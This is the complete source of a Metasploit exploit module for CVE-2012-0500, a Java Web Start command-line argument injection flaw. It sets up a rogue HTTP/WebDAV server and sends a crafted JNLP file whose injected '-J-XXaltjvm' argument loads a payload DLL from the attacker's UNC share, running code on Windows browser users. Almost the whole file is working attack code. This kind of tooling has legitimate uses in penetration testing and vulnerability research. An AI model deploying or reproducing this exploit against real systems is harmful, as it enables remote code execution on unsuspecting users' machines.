# $Id$
##
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    #
    # This module acts as an HTTP server
    #
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sun Java Web Start Plugin Command Line Argument Injection (2012)&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a flaw in the Web Start component of the Sun Java
                Runtime Environment. The arguments passed to Java Web Start are not properly
                validated, allowing injection of arbitrary arguments to the JVM.
                By utilizing the lesser known -J option, an attacker can take advantage of
                allows an attacker to execute arbitrary code in the context of an unsuspecting
                browser user.
                In order for this module to work, it must be ran as root on a server that
                does not serve SMB. Additionally, the target host must have the WebClient
                service (WebDAV Mini-Redirector) enabled.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => &#039;jduck&#039;, # Bug reported to Oracle by TELUS
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0500&#039; ],
                    [ &#039;OSVDB&#039;, &#039;79227&#039; ],
                    [ &#039;BID&#039;, &#039;52015&#039; ],
                    [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2012/Feb/251&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html&#039; ]
                ],
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024,
                    &#039;BadChars&#039; => &#039;&#039;,
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff"
                },
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                    [ &#039;Java Runtime on Windows x86&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Arch&#039; => ARCH_X86
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Feb 14 2012&#039;
            ))
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The daemon port to listen on", 80 ]),
                OptString.new(&#039;URIPATH&#039;, [ true, "The URI to use.", "/" ]),
                OptString.new(&#039;UNCPATH&#039;, [ false, &#039;Override the UNC path to use. (Use with an SMB server)&#039; ])
            ], self.class)
    end
    def auto_target(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        ret = nil
        #print_status("Agent: #{agent}")
        # Check for MSIE and/or WebDAV redirector requests
        if agent =~ /(Windows NT (5|6)\.(0|1|2)|MiniRedir\/(5|6)\.(0|1|2))/
            ret = targets[1]
        elsif agent =~ /MSIE (6|7|8)\.0/
            ret = targets[1]
        else
            print_status("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
        end
        ret
    end
    def on_request_uri(cli, request)
        # For this exploit, this does little besides ensures the user agent is a recognized one..
        mytarget = target
        if target.name == &#039;Automatic&#039;
            mytarget = auto_target(cli, request)
            if (not mytarget)
                send_not_found(cli)
                return
            end
        end
        # Special case to process OPTIONS for /
        if (request.method == &#039;OPTIONS&#039; and request.uri == &#039;/&#039;)
            process_options(cli, request, mytarget)
            return
        end
        # Discard requests for ico files
        if (request.uri =~ /\.ico$/i)
            send_not_found(cli)
            return
        end
        # If there is no subdirectory in the request, we need to redirect.
        if (request.uri == &#039;/&#039;) or not (request.uri =~ /\/([^\/]+)\//)
            if (request.uri == &#039;/&#039;)
                subdir = &#039;/&#039; + rand_text_alphanumeric(8+rand(8)) + &#039;/&#039;
            else
                subdir = request.uri + &#039;/&#039;
            end
            print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
            send_redirect(cli, subdir)
            return
        else
            share_name = $1
        end
        # dispatch WebDAV requests based on method first
        case request.method
        when &#039;OPTIONS&#039;
            process_options(cli, request, mytarget)
        when &#039;PROPFIND&#039;
            process_propfind(cli, request, mytarget)
        when &#039;GET&#039;
            process_get(cli, request, mytarget, share_name)
        when &#039;PUT&#039;
            print_status("Sending 404 for PUT #{request.uri} ...")
            send_not_found(cli)
        else
            print_error("Unexpected request method encountered: #{request.method}")
        end
    end
    #
    # GET requests
    #
    def process_get(cli, request, target, share_name)
        print_status("Responding to \"GET #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        # dispatch based on extension
        if (request.uri =~ /\.dll$/i)
            #
            # DLL requests sent by IE and the WebDav Mini-Redirector
            #
            print_status("Sending DLL to #{cli.peerhost}:#{cli.peerport}...")
            # Re-generate the payload
            return if ((p = regenerate_payload(cli)) == nil)
            # Generate a DLL based on the payload
            dll_data = generate_payload_dll({ :code => p.encoded })
            # Send it :)
            send_response(cli, dll_data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
        elsif (request.uri =~ /\.jnlp$/i)
            #
            # Send the jnlp document
            #
            # Prepare the UNC path...
            if (datastore[&#039;UNCPATH&#039;])
                unc = datastore[&#039;UNCPATH&#039;].dup
            else
                my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
                unc = "\\\\" + my_host + "\\" + share_name
            end
            # NOTE: we ensure there&#039;s only a single backslash here since it will get escaped
            if unc[0,2] == "\\\\"
                unc.slice!(0, 1)
            end
            http_agent = Rex::Text.rand_text_alpha(8+rand(8))
            jnlp_data = <<-EOS
<?xml version="1.0" encoding="UTF-8"?>
<jnlp version="1">
<information>
   <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>
   <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>
   <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>
</information>
<resources>
   <java version="1.3+" initial-heap-size=&#039;512m" -J-XXaltjvm=#{unc} "&#039; />
</resources>
<resources><java java-vm-args=&#039;-Dhttp.agent=#{http_agent}"&#039; /></resources>
</jnlp>
EOS
            print_status("Sending JNLP to #{cli.peerhost}:#{cli.peerport}...")
            send_response(cli, jnlp_data, { &#039;Content-Type&#039; => &#039;application/x-java-jnlp-file&#039; })
        else
            print_status("Sending redirect to the JNLP file to #{cli.peerhost}:#{cli.peerport}")
            jnlp_name = Rex::Text.rand_text_alpha(8 + rand(8))
            jnlp_path = get_resource()
            if jnlp_path[-1,1] != &#039;/&#039;
                jnlp_path << &#039;/&#039;
            end
            jnlp_path << request.uri.split(&#039;/&#039;)[-1] << &#039;/&#039;
            jnlp_path << jnlp_name << ".jnlp"
            send_redirect(cli, jnlp_path, &#039;&#039;)
        end
    end
    #
    # OPTIONS requests sent by the WebDav Mini-Redirector
    #
    def process_options(cli, request, target)
        print_status("Responding to WebDAV \"OPTIONS #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        headers = {
            #&#039;DASL&#039;   => &#039;<DAV:sql>&#039;,
            #&#039;DAV&#039;    => &#039;1, 2&#039;,
            &#039;Allow&#039;  => &#039;OPTIONS, GET, PROPFIND&#039;,
            &#039;Public&#039; => &#039;OPTIONS, GET, PROPFIND&#039;
        }
        send_response(cli, &#039;&#039;, headers)
    end
    #
    # PROPFIND requests sent by the WebDav Mini-Redirector
    #
    def process_propfind(cli, request, target)
        path = request.uri
        print_status("Received WebDAV \"PROPFIND #{request.uri}\" request from #{cli.peerhost}:#{cli.peerport}")
        body = &#039;&#039;
        if (path =~ /\.dll$/i)
            # Response for the DLL
            print_status("Sending DLL multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
            body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        elsif (path =~ /\/$/) or (not path.sub(&#039;/&#039;, &#039;&#039;).index(&#039;/&#039;))
            # Response for anything else (generally just /)
            print_status("Sending directory multistatus for #{path} ...")
            body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        else
            print_status("Sending 404 for #{path} ...")
            send_not_found(cli)
            return
        end
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp[&#039;Content-Type&#039;] = &#039;text/xml&#039;
        cli.send_response(resp)
    end
    #
    # Make sure we&#039;re on the right port/path to support WebDAV
    #
    def exploit
        if datastore[&#039;SRVPORT&#039;].to_i != 80 || datastore[&#039;URIPATH&#039;] != &#039;/&#039;
            raise RuntimeError, &#039;Using WebDAV requires SRVPORT=80 and URIPATH=/&#039;
        end
        super
    end
end



